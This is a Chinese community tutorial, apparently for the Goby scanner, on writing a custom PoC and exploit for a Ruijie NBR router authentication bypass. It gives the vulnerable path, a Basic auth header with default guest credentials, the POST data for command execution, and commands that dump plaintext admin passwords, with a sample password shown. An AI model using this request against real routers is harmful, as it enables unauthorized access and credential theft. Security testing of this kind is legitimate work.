自定义漏洞配合EXP，提高漏洞的利用速度，简直是爽的飞起！自从攻防演练的时候Goby发布攻防演练专版，羡慕死了，就是太菜没傍上红方大佬的腿。虽然最终用上了攻防演练专版，但是一些只有你自己知道的漏洞，或者比较偏门的漏洞，就需要咱们自己来编写PoC或者是EXP。因为Goby没有开源，所以也能编写一些基于http命令执行的漏洞！特别感谢Goby的大佬——帅帅的涛哥支持。

## 0x001 最终效果

直接获取明文密码，点击验证。

![](https://image.3001.net/images/20201106/1604654218_5fa5148ae29c519fa42eb.gif!small)

## 0x002 编写流程

我在《自定义PoC对接插件》一文中已经介绍过了如何编写自定义POC，这次我们还是按照这个流程走一下。

###  **2.1 漏洞简介**

 **漏洞名称** ： **锐捷NBR路由器COOKIE欺骗权限绕过**

 **详情**
：锐捷设备保留两个账户manager和guest，并且这两个账户都不能删除，默认密码同账户名。如下图只要修改完cookie在重新刷新一下即可登录到admin管理界面。

![](https://image.3001.net/images/20201113/1605263480_5fae607897a007b3d5a3b.png!small)用guest账户登录完是这样子的，左侧菜单栏都木有的！

![](https://image.3001.net/images/20201113/1605263466_5fae606a02b30efde3955.png!small)修改完cookie刷新之后是这样子的，左侧菜单栏都出现了：

![](https://image.3001.net/images/20201113/1605263491_5fae6083110c8ce8fecb0.png!small)在登录处进行抓包，可以看到登陆的时候发送的post请求，基于http
basic认证，并且发送command命令show
clock：![](https://image.3001.net/images/20201113/1605263503_5fae608f22778df179784.png!small)如果是没有认证，执行这个命令是不会有结果的，如下图：

###
![](https://image.3001.net/images/20201113/1605263514_5fae609abdbcb51adae90.png!small)2.2
POC关键参数

漏洞URL

    
    
    /WEB_VMS/LEVEL15/

Header部分

    
    
    Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=

Data部分

    
    
    command=show clock&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.

 **还有一些可以执行的命令:**

查看配置

    
    
    show run

查看LAN和WAN口

    
    
    show sys-mod

查看用户等等

    
    
    show webmaster users

### 2.3 POC编写

首先，路由器的goby规则是app="Ruijie-NBR-Router"，完成这两个必填项即可。

![](https://image.3001.net/images/20201113/1605263525_5fae60a58c04740049c2a.png!small)下一步，测试部分的四个必填项。漏洞简介里面咱们已经知道了这四项参数，逐一添加进去。

![](https://image.3001.net/images/20201113/1605263538_5fae60b2885e5efe963b1.png!small)剩下就是响应测试部分的填写了，一个判断存在漏洞的部分，在漏洞简介里面截图，可以看到响应的部分，找一个比较唯一的准确的关键参数作为存在漏洞的标识，然后保存。

![](https://image.3001.net/images/20201113/1605263549_5fae60bdb8fed434b7f49.png!small)POC部分就写好了！其实EXP部分也就完成80%了。

### 2.4 EXP编写

首先，找到刚才编写的POC自动生成的JSON文件。

    
    
    路径：\goby-win-x64-1.8.202\golib\exploits\user

![](https://image.3001.net/images/20201113/1605263560_5fae60c8af38b2b891773.png!small)

打开json文件？没错，因为UI里没有地方写，咱们只能在json里写了！

在Scanstep上面添加语句：

![](https://image.3001.net/images/20201113/1605263818_5fae61ca72ba9326eceb1.png!small)

其实这部分，要是细心的小伙伴就能发现Goby和FOFA写EXP是一个样子的

![](https://image.3001.net/images/20201113/1605263934_5fae623e1892e901d1b5a.png!small)

所以接下来，和FOFA一样有个ExploitSteps部分，但是goby相对于FOFA来说好写的很多，只需要将Scanstep部分复制下来即可，这就是说为什么写完PoC部分相当于完成EXP的80%了，然后添加output|lastbody把响应的body展示出来，OK了。

![](https://image.3001.net/images/20201113/1605264027_5fae629b4785354d7eb37.png!small)

看一下结果，show webmaster users看的是账号的明文密码，ruijie@2017

![](https://image.3001.net/images/20201113/1605264213_5fae6355e57bc08b8a907.png!small)结果是支持正则匹配，但是因为还不算完善，不能做多个匹配，这里就直接显示admin的密码就好了：

![](https://image.3001.net/images/20201113/1605264176_5fae63307b1bca94bea86.png!small)

效果如下图，这次看起来比较清爽了！（考考你们中文那部分加在哪里拉？）

![](https://image.3001.net/images/20201113/1605264227_5fae6363d43012f390055.jpg!small)

### 2.5 交互命令编写

在ExpParams处我们有个参数就是cmd:

![](https://image.3001.net/images/20201113/1605264250_5fae637adb8437359ba13.png!small)

现在需要改两处就可以，直接调用cmd也就是:

    
    
    show webmaster users

因为cmd的类型是input，也就是说，输入什么执行什么，从而达到命令交互。大概就这个意思。至于output输出部分，因为是每个命令执行返回的内容都不一样，没法用同一种正则去匹配所有响应结果，所以只能把整个body展示出来。

![](https://image.3001.net/images/20201113/1605264261_5fae6385c164721896c9b.png!small)

## 0x003 小结

正则真是菜出天际了！各位见笑了。我觉得Exp部分还是挺有意思的，利用漏洞的时候方便一些！也能更好的理解Goby吧！还是那句话，我很喜欢Goby，特别适合我这种又菜又懒又严重依赖工具的脚本小子，软件又不会写，但是工具咱必须要用明白哈哈！祝Goby越来越好。

> 下载Goby内测版，请关注公众号：Gobysec
>
> 下载Goby正式版，请访问官网：http://gobies.org

 **本文作者：Goby社区成员 mojie**

